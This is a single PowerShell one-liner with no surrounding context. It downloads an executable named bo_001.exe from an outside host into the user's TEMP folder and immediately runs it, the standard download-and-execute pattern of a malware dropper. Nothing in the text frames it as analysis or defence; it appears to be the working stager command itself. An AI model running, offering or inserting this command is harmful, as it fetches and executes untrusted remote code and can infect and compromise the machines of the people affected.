
(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/b1/bo_001.exe',"$env:TEMP\bo_001.exe");Start-Process ("$env:TEMP\bo_001.exe")

